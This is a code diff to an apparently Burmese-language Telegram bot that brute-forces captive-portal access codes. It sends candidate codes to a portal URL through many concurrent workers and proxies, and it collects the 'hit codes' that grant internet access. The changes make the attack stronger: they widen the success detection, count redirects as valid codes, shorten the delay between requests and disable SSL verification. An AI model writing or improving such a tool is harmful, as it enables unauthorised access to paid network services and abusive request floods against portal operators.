@@ -73,7 +73,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [
         [InlineKeyboardButton("🌐 Update Portal Link", callback_data="update_portal")],
-        [InlineKeyboardButton("⚙️️ Mode", callback_data="change_mode")],
+        [InlineKeyboardButton("⚙️ Mode", callback_data="change_mode")],
         [InlineKeyboardButton(f"🔧 Workers: {user_workers[chat_id]}", callback_data="change_workers")],
         [InlineKeyboardButton(f"🔀 Proxies: {current_proxy_display}", callback_data="add_proxies")],
         [InlineKeyboardButton("🚀 Start Scanner", callback_data="start_scanner")]
@@ -163,7 +163,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer()
         portal = user_portals.get(chat_id)
         if not portal:
-            await query.message.reply_text("⚠️️ ပထမဦးစွာ Portal URL ကို အရင် Update လုပ်ပါ။")
+            await query.message.reply_text("⚠️ ပထမဦးစွာ Portal URL ကို အရင် Update လုပ်ပါ။")
             return
         if scanning_states.get(chat_id, False):
             await query.message.reply_text("⚠️ စကင်န်ဖတ်ခြင်း လုပ်ငန်းစဉ် လုပ်ဆောင်ဆဲ ဖြစ်ပါသည်။")
@@ -223,16 +223,26 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             
         try:
             target_url = f"{portal_url}&code={code_val}" if "?" in portal_url else f"{portal_url}?code={code_val}"
-            async with session.get(target_url, proxy=proxy, timeout=2.5) as response:
+            async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
                 html_content = await response.text()
                 lower_html = html_content.lower()
                 
-                # အောင်မြင်မှု၊ သက်တမ်းကုန်မှုနှင့် Limit ဖြစ်မှုများကို စစ်ဆေးခြင်း
-                success_keywords = ["success", "welcome", "connected", "auth_pass", "login successfully", "internet", "minutes", "hours", "remaining"]
-                expired_keywords = ["expired", "invalid", "timeout", "used", "incorrect"]
-                limit_keywords = ["limit", "already logged", "in use", "too many", "blocked", "restricted"]
+                # ပိုမိုစုံလင်သော Success Keywords များ
+                success_keywords = [
+                    "success", "welcome", "connected", "auth_pass", "login successfully", 
+                    "internet", "minutes", "hours", "remaining", "authenticated", 
+                    "congratulations", "online", "access granted"
+                ]
+                expired_keywords = ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]
+                limit_keywords = ["limit", "already logged", "in use", "too many", "blocked", "restricted", "exceeded"]
                 
-                if response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html:
+                # အောင်မြင်မှု အခြေအနေစစ်ဆေးခြင်း (Redirect သို့မဟုတ် Success Keywords ပါဝင်ခြင်း)
+                is_success = (
+                    (response.status == 200 and any(kw in lower_html for kw in success_keywords) and "error" not in lower_html and "fail" not in lower_html) or
+                    response.status in [301, 302, 303]
+                )
+
+                if is_success:
                     if chat_id not in found_codes:
                         found_codes[chat_id] = []
                     if code_val not in found_codes[chat_id]:
@@ -244,7 +254,7 @@ async def worker_task(worker_id, session, portal_url, chat_id):
                     
         except Exception:
             pass
-        await asyncio.sleep(0.005)
+        await asyncio.sleep(0.002)
 
 async def run_scanner_with_workers(query, context, portal_url):
     chat_id = query.message.chat_id
@@ -269,7 +279,7 @@ async def run_scanner_with_workers(query, context, portal_url):
         reply_markup=stop_keyboard
     )
     
-    connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count)
+    connector = aiohttp.TCPConnector(limit=workers_count, limit_per_host=workers_count, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = [
             asyncio.create_task(worker_task(i, session, portal_url, chat_id)) 
@@ -298,7 +308,7 @@ async def run_scanner_with_workers(query, context, portal_url):
                 f"⚠️ Limits: {limits}\n"
                 f"⚡ Speed: {speed:,.1f} c/m\n"
                 "___________________________________\n"
-                "🔥 Hit Codes:\n"
+                "🔥 Hit Codes Found:\n"
                 f"{hits_str}"
             )
             try:
